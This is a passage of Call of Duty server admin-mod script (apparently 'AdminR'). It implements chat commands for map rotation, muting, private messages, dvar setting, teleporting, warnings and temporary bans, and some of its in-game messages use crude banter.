      sender systemSay("^1You must supply a map: !map <map>");
}
maprestart(sender)
{
   systemSayAll("^2Restarting map in...");
   wait 1.5;
   map(getDvar("mapname"));
}
maprotate(sender)
{
   string = "";
   nextmap = "";
   list = strtok(getDvar("sv_mapRotation"), " ");
   foreach(map in list)
      if(map != "map" && map != "gametype" && map != "arena" && map != "ctf" && map != "dd" && map != "dm" && map != "dom" && map != "gtnw" && map != "koth" && map != "oneflag" && map != "sab" && map != "sd" && map != "war")
         string += map + ";";
   maps = strtok(string, ";");
   for(i=0;i<maps.size;i++)
      if(getDvar("mapname") == maps[i])
         if(isDefined(maps[i+1]))   {
            nextmap = maps[i+1];
            break;
         }
         else   nextmap = maps[0];
   systemSayAll("^2Rotating map in...");
   wait 1;
   map(nextmap);
}
mask(sender, argument)
{
   victim = sender;
   arg = strtok(argument, " ");
   mask = int(arg[0]);
   if(arg.size > 1)
   {
      victim = getPlayer(arg[0]);
      mask = int(arg[1]);
   }
   if(victim != level)
   {
      victim.adminR.mask = mask;
      sender systemSay("^5" + victim.name + "^7 has been masked to ^2" + mask + "^7 access");
   }
}
message(sender, string)
{
   if(!isDefined(level.msgHUD))
   {
      level.msgHUD = level createServerFontString("hudsmall", 1);
      level.msgHUD setPoint("TOPLEFT", "TOPLEFT", 3, 110);
      level.msgHUD.HideWhenInMenu = true;
      level.msgHUD.foreground = true;
   }
   level.msgHUD.glowAlpha = 0;
   level.msgHUD setText(string);
}
mymsg(sender,string, one, two, three)
{
    if(!isDefined(level.msgHUD))
    {
      level.msgHUD = level createServerFontString("hudsmall", 1);
      level.msgHUD setPoint("TOPLEFT", "TOPLEFT", 3, 110);
      level.msgHUD.HideWhenInMenu = true;
      level.msgHUD.foreground = true;
    }
	level.msgHUD.glowAlpha = 1;
    //level.msgHUD.glowcolor = (one,two,three);
	level.msgHUD.glowcolor = (1,0,0);
	level.msgHUD setText(string);
	level.msgHUD setpulsefx(100,6000000000,900000000000);
}
mod(sender, string)
{
   setDvar("fs_game", "mods/" + string);
   systemSayAll("^5" + sender.name + "^7 set Mod to ^2" + string);
   systemSayAll("Mod will change upon restart");
}
mute(sender, player)
{
   if(player != "")
   {
      victim = getPlayer(player);
      if(sender.adminR.access > victim.adminR.access && victim != level)
      {
         if(victim.adminR.muted)   victim.adminR.muted = false;
         else victim.adminR.muted = true;
      }
   }
   else sender systemSay("^1You must supply a player name: !mute <player>");
}
nextmap(sender)
{
   string = "";
   nextmap = "";
   list = strtok(getDvar("sv_mapRotation"), " ");
   foreach(map in list)
      if(map != "map" && map != "gametype" && map != "arena" && map != "ctf" && map != "dd" && map != "dm" && map != "dom" && map != "gtnw" && map != "koth" && map != "oneflag" && map != "sab" && map != "sd" && map != "war")
         string += map + ";";
   maps = strtok(string, ";");
   for(i=0;i<maps.size;i++)
      if(getDvar("mapname") == maps[i])
         if(isDefined(maps[i+1]))   {
            nextmap = maps[i+1];
            break;
         }
         else   nextmap = maps[0];
         foreach(map in level.map)
            if(nextmap == map.console)
               sender systemSay("Next map: ^2" + map.name);
}
origin(sender, player)
{
   victim = sender;
   if(player != "")   victim = getPlayer(player);
   if(victim != level)   
      sender systemSay(victim.origin);
}
pm(sender, argument)
{
   arg = strtok(argument, " ");
   string = "";
   for(i=1;i<arg.size;i++)
      string += arg[i] + " ";
   victim = getPlayer(arg[0]);
   if(victim != level)
   {
      sender systemSay("^0[^2PM^0] ^7to ^0[^5" + victim.name + "^0]^7: " + string);
      victim systemSay("^0[^2PM^0] ^7from ^0[^5" + sender.name + "^0]^7: " + string);
   }
}
printt(sender, string)   {   iPrintln(string);   }
printbold(sender, string)   {   iPrintlnBold(string);   }
putgroup(sender, argument){}
rage(sender)
{
   sender sayAll("^1I just rage quit, like a little bitch.");
   kick(sender getEntityNumber());
}
rcon(sender, argument)
{
   if(argument != "")
   {
      arg = strtok(argument, " ");
      string = "";
      if(arg.size > 1)
      {
         if(arg.size > 2)
         {
            for(i=1;i<arg.size;i++)
               string += arg[i] + " ";
            setDvar(arg[0], string);
            sender systemSay("Rcon: " + arg[0] + ", " + string);
         }
         else{
            setDvar(arg[0], arg[1]);
            sender systemSay("Rcon: " + arg[0] + ", " + arg[1]);
         }
      }
      else sender systemSay("Missing Value: !rcon <dvar> <value>");
   }
   else   sender systemSay("Missing Dvar: !rcon <dvar> <value>");
}
rename(sender, argument)
{
   if(argument != "")
   {
      arg = strtok(argument, " ");
      if(arg.size > 1)
      {
         victim = getPlayer(arg[0]);
         if(victim != level)
         {
            oldname = victim.name;
            victim.name = arg[1];
            victim.pers["name"] = arg[1];
            systemSayAll("^5" + sender.name + "^7 renamed ^1" + oldname + "^7 to ^2" + arg[1]);
         }
      }
      else   sender systemSay("^1You must supply a new name: !rename <player> <new name>");
   }
   else   sender systemSay("^1You must supply a player name: !rename <player> <new name>");
}
rules(sender, int)
{
   i=1;
   if(int == "")
      foreach(rule in level.adminR.rule)
      {
         sender systemSay("Rule " + i + ": " + rule);
         i++;
         wait 1;
      }
   else
   {
      if(isDefined(level.adminR.rule[int(int) - 1]))
         sender systemSay("Rule " + int + ": " + level.adminR.rule[int(int) - 1]);
      else   sender systemSay("^1Could not find Rule " + int);
   }
}
say(sender, string)
{
   systemSayAll(string);
}
score(sender, argument)
{
   victim = sender;
   arg = strtok(argument, " ");
   score = int(arg[0]);
   if(arg.size > 1)
   {
      victim = getPlayer(arg[0]);
      score = int(arg[1]);
   }
   if(victim != level)
   {
      victim.score = score;
      victim.pers["score"] = score;
      sender systemSay("^5" + victim.name + "^7's Score set to: ^2" + score);
   }
}
scorelimit(sender, int)
{
   setDvar("scr_" + getDvar("g_gametype") + "_scorelimit", int(int));
   systemSayAll("^5" + sender.name + "^7 set scorelimit to ^2" + int(int));
}
scream(sender, string)
{
   for(i=0;i<7;i++)
   {
      systemSayAll("^" + i + string, 1);
      wait .8;
   }
}
shock(sender, player)
{
   victim = sender;
   if(isDefined(player))   victim = getPlayer(player);
   if(sender.adminR.access >= victim.adminR.access && victim != level)
   {
      victim thread maps\mp\_radiation::radiationEffect();
      sender systemSay("You Shocked ^5" + victim.name );
      if(victim != sender)   victim systemSay("You were Shocked by ^5" + sender.name);
   }
}
shout(sender, string)
{
   shout = spawnstruct();
   shout.titleText = string;
   shout.glowColor = (0,.4,.9);
   foreach(player in level.players)
      player thread maps\mp\gametypes\_hud_message::notifyMessage( shout );
}
space(sender, player)
{
   if(player != "")
   {
      victim = getPlayer(player);
      if(sender.adminR.access >= victim.adminR.access && victim != level)
      {
         victim setOrigin(sender.origin+(0,0,1000));
         sender systemSay("sent ^5" + victim.name + "^7 to space!");   
         victim systemSay(sender.name + "sent you to space!");   
      }
   }
   else sender systemSay("^1You must supply a player name: !space <player>");
}
spectator(sender, player)
{
   victim = sender;
   if(player != "")   victim = getPlayer(player);
   if(victim != level)
   {
      if(!victim.spectating)
      {
         victim.prevteam = victim.team;
         victim thread forceteam(true, "spectator");
         victim.spectating = true;
         sender systemSay("^5" + victim.name + "^7 is now spectating");
      }
      else
      {
         victim thread forceteam(true, victim.prevteam);
         victim.spectating = false;
         sender systemSay("^5" + victim.name + "^7 is no longer spectating");
      }
   }
}
forceteam(spectate, team)
{
   self notify("menuresponse", game["menu_team"], team);
}
start(){}
status(sender)
{
   sender systemSay("This Server uses ^4Admin^0R^7");
   sender systemSay("the latest Admin System for ^4R^0epZ");
}
suicidee(sender)   {   sender suicide();   }
teamchange(sender, player)
{
   victim = sender;
   if(player != "")   victim = getPlayer(player);
   if(victim != level)
   {
      if(victim.team == "allies")   team = "axis";
      else   team = "allies";
      sender systemSay("Changed ^5" + victim.name + "^7's Team");
      victim thread forceteam(false, team);
   }
}
tempban(sender, player)
{
   if(player != "")
   {
      victim = getPlayer(player);
      if(victim == sender)   sender systemSay("^1You cannot ban yourself.");
      else
      {
         if(victim.adminR.access < sender.adminR.access && victim != level)
         {
            kick(victim getEntityNumber());
            iprintln("^1" + victim.name + " has been banned until next map");
            banned(victim.name, victim.guid);
         }
         else   sender systemSay("^1You cant ban ^5" + victim.name + "^1 he owns you bitch.");
      }
   }
   else sender systemSay("^1You must supply a player name: !tempban <player>");
}
teleport(sender, argument)
{
   if(argument != "")
   {
      player = strtok(argument, " ");
      if(player.size > 1)
      {
         victim1 = getPlayer(player[0]);
         if(victim1 != level)
         {
            victim2 = getPlayer(player[1]);
            if(victim2 != level)
            {
               victim1 setOrigin(victim2.origin);
               sender systemSay("Teleported ^5" + victim1.name + "^7 to ^5" + victim2.name);
            }
         }
      }
      else
      {
         victim = getPlayer(player[0]);
         if(victim != level)
         {
            sender setOrigin(victim.origin);
            sender systemSay("Teleported to ^5" + victim.name);
         }
      }
   }
   else   sender systemSay("^1You must supply a playername: !teleport <player> (<player2>)");
}
thirdperson(sender)
{
   if(!sender.adminR.third)
   {
      sender setClientDvar("cg_thirdperson", 1);
      sender.adminR.third = true;
   }
   else
   {
      sender setClientDvar("cg_thirdperson", 0);
      sender.adminR.third = false;
   }
}
timelimit(sender, int)
{
   setDvar("scr_" + getDvar("g_gametype") + "_timelimit", int(int));
   systemSayAll("^5" + sender.name + "^7 Set the timelimit to ^2" + int(int));
}
toadmins(sender, string)
{
   foreach(player in level.players)
      if(player.adminR.access > 0 && player != sender)
         player systemSay("^0[^1APM^0] ^7from ^0[^5" + sender.name + "^0]^7: " + string);
   sender systemSay("^0[^1APM^0] ^7to Admins: " + string);
}
use(sender, command)
{
   if(command != "")
   {
      string = "Could not find command: " + command;
      for(i=0;i<level.cmd.size;i++)
      {
         aliases = strtok(level.cmd[i].cmd, " ");
         foreach(alias in aliases)
            if(command == alias)
               string = "^3Use^7: " + level.cmd[i].use;
      }
      sender systemSay(string);
   }
   else   sender systemSay("^1You must supply a command: !use <command>");
}
votemap(sender, string){}
voteno(sender){}
voteyes(sender){}
warn(sender, argument)
{
   if(argument != "")
   {
      arg = strtok(argument, " ");
      victim = getPlayer(arg[0]);
      if(victim != sender && sender.adminR.access > victim.adminR.access && victim != level)
      {
         string = "";
         for(i=1;i<arg.size;i++)
            string += arg[i] + " ";
         victim.adminR.warnings++;
         if(string == "")
            systemSayAll("^1Warning ^0[^7" + victim.adminR.warnings + "^0] ^1" + victim.name, 1.5);
         else
            systemSayAll("^1Warning ^0[^7" + victim.adminR.warnings + "^0] ^1" + victim.name + " " + string, 1.5);
         if(victim.adminR.warnings > 2)
         {
            systemSayAll("^1" + victim.name + "^7 Will be automatically kicked in 10 seconds", 1.5);
            wait 10;
            kick(victim getEntityNumber(), "EXE_PLAYERKICKED");
         }
      }
   }
   else sender systemSay("^1You must supply a player name: !warn <player> (<reason>)");
}
warnclear(sender, player)
{
   if(player != "")
   {
      victim = getPlayer(player);
      if(victim != level)
      {
         victim.adminR.warnings = 0;
         systemSayAll("All Warnings Cleared for ^5" + victim.name);
      }
   }
   else   sender systemSay("^1You must supply a player name: !warnclear <player>");
}
warnremove(sender, player)
{
   if(player != "")
   {
      victim = getPlayer(player);
      if(victim != level)
      {
         if(victim.adminR.warnings > 0)
         {
            victim.adminR.warnings--;
            systemSayAll("Last warning for ^5" + victim.name + "^7 has been removed");
         }
         else   sender systemSay("^5" + victim.name + "^7 has no warnings");
      }
   }
   else   sender systemSay("^1You must supply a player name: !warnremove <player>");
}
xfps(sender)
{
   dvar = "fx_enable;cg_blood;cg_brass;cl_maxpackets;fx_marks;fx_marks;fx_marks_ents;fx_marks_smodels;fx_drawclouds;r_fullbright;";
   dvar += "r_altModelLightingUpdate;r_dlightLimit;r_drawSun;r_drawWater;r_fastSkin;r_multiGpu;r_vsync;r_texFilterAnisoMax;sm_maxLights";
   vars = strtok(dvar, ";");
   if(!sender.adminR.xfps)
   {
      vals = strtok("0;0;0;100;0;0;0;0;1;1;0;0;0;1;1;0;1;0",";");
      sender.adminR.xfps = true;
      sender.adminR.fps = true;
      sender systemSay("Extra FPS Enabled");
   }
   else
   {
      vals = strtok("1;1;1;30;1;1;1;1;0;0;4;1;1;1;0;1;16;4",";");
      sender.adminR.xfps = false;
      sender.adminR.fps = true;
      sender systemSay("Extra FPS Disabled");
   }
   for(i=0;i<vars.size;i++)
      sender setClientDvar(vars[i], int(vals[i]));
}
/*      Command Functions      */